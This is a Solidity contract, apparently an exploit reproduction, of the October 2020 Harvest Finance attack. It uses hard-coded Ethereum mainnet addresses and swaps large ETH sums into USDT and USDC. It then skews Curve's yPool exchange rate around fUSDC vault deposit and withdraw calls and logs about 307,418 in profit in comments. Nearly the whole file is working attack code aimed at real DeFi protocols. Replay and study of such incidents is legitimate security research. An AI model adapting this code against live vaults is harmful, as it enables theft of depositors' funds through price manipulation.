// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";
// 0x35f8d2f572fceaac9288e5d462117850ef2694786992a8c3f6d02612277b0877

// Block 11129474
// Block index 0
// Timestamp Mon, 26 Oct 2020 02:53:58 +0000
// Gas price 525 gwei
// Gas limit 12065986

contract Harvest_USDT_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UniswapETHUSDTAddress = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address private constant UniswapETHUSDCAddress = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address private constant yUSDCAddress = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;
    address private constant CurveFiAddress = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;

    address private constant fFarmAddress = 0x9B3bE0cc5dD26fd0254088d03D8206792715588B;
    address private constant VaultProxyAddress = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    address private constant StrategyAddress = 0xD55aDA00494D96CE1029C201425249F9dFD216cc;


    IUSDT USDT = IUSDT(USDTAddress);
    IUSDC USDC = IUSDC(USDCAddress);
    yUSDC _yUSDC = yUSDC(yUSDCAddress);
    yERC20 CURVE_yPool = yERC20(CurveFiAddress);
    IERC20 VaultERC = IERC20(VaultProxyAddress);
    IfUSDC fUSDC = IfUSDC(VaultProxyAddress);
    IStrategy Strategy = IStrategy(StrategyAddress);



    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str80 = "";
    string str81 = "";
    string str82 = "";


    constructor() payable {
        require(msg.value == 200000 ether, "loan amount does not match");
        StandardToken(USDTAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(VaultProxyAddress, 2**256 - 1);

        EOA = msg.sender;
    }

    receive() external payable {}
    
                    
    // loan amount = 18308555.417594 USDT and 5000 0000 USDC
    function attack0( uint aa, uint bb, uint cc, uint dd ) public {
        // step 1: get 1830 8555.417594 USDT and 5000 0000 USDC for attack
        address[] memory ad = new address[](2);
        ad[0] = WETHAddress;
        ad[1] = USDTAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapETHForExactTokens{value: 50000 ether} (18308555417594 , ad, address(this), 2000000000);
        ad[0] = WETHAddress;
        ad[1] = USDCAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapETHForExactTokens{value: 150000 ether} (50000000000000, ad, address(this), 2000000000);
        // -----------------------------18308555.417594 USDT and 50000000.00000000 USDC--------------------------------------------------------------
    
      // Action: Curve_USDT2USDC
      CURVE_yPool.exchange_underlying(2, 1, aa * 10 ** 6, 0);  
      // Action: fUSDC_deposit
      fUSDC.deposit(bb * 1e6); 
      // Action: Curve_USDC2USDT
       CURVE_yPool.exchange_underlying(1, 2, cc * 10 ** 6, 0); 
      // Action: fUSDC_withdraw
      fUSDC.withdraw(dd * 10 ** 6); 


        // ==================== Swap ========================================
        IOneSplitAudit OneSplitAudit = IOneSplitAudit(0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E);

        if(USDC.balanceOf(address(this)) > 50000000e6){
            uint USDCdiff = USDC.balanceOf(address(this)) - 50000000e6;
            (, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(address(USDC), address(USDT), USDCdiff, 10, 0);
            USDC.approve(address(OneSplitAudit), 0);
            USDC.approve(address(OneSplitAudit), 2**256 - 1);
            OneSplitAudit.swap(address(USDC), address(USDT), USDCdiff, 0, distribution, 0);      
        } 
        else if(USDT.balanceOf(address(this)) > 18308555417594){
            uint USDTdiff = USDT.balanceOf(address(this)) - 18308555417594;
            (, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(address(USDT), address(USDC), USDTdiff, 10, 0);
            USDT.approve(address(OneSplitAudit), 0);
            USDT.approve(address(OneSplitAudit), USDTdiff);
            OneSplitAudit.swap(address(USDT), address(USDC), USDTdiff, 0, distribution, 0); 
        }
        revert(ProfitSummary());


        // current balance      : 18317289.039415 USDT and 50298684 USDC
        // compared to flashloan: 18308555.417594 USDT and 50000000 USDC
        // Profit                    8734        USDT and    298684 USDC
        // Total Profit:             307418
    }

    
    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDT.balanceOf(address(this));
        uint balance2 = USDC.balanceOf(address(this));
        str1 = append("USDT balance: ", uint2str(balance1 / 10 ** 6));
        str2 = append(" || USDC balance: ", uint2str(balance2 / 10 ** 6));
        return append(str1, str2);
    }

    function CurveSummary() internal returns (string memory _uintAsString){
        uint balance1 = CURVE_yPool.balances(1) / 10 ** 6;
        uint balance2 = CURVE_yPool.balances(2) / 10 ** 6;
        return append(append("Curve yUSDC balance: ", uint2str(balance1)), append( "  Curve yUSDT balance: ", uint2str(balance2)));
    }

    function fUSDCSummary_invested_underlying() internal returns (string memory _uintAsString){
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        str81 = append("invested underlying balance: ", uint2str(invested));
        return str81;
    }


    function fUSDCSummary_rest() internal returns (string memory _uintAsString){
        uint underlyingBalance =  fUSDC.underlyingBalanceInVault() / 10 ** 6;
        uint totalSupply = fUSDC.totalSupply() / 10 ** 6;
        str80 = append("fUSDC underlying balance: ", uint2str(underlyingBalance));
        str82 = append("fUSDC total supply: ", uint2str(totalSupply));
        return appendWithSpace(str80 , str82);
    }


    function fUSDCSummary() internal returns (string memory _uintAsString){
        uint underlyingBalance =  fUSDC.underlyingBalanceInVault() / 10 ** 6;
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        uint totalSupply = fUSDC.totalSupply() / 10 ** 6;
        str80 = append("fUSDC underlying balance: ", uint2str(underlyingBalance));
        str81 = append("invested underlying balance: ", uint2str(invested));
        str82 = append("fUSDC total supply: ", uint2str(totalSupply));
        return appendWithSpace(appendWithSpace(str80 , str81), str82);
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }
}

                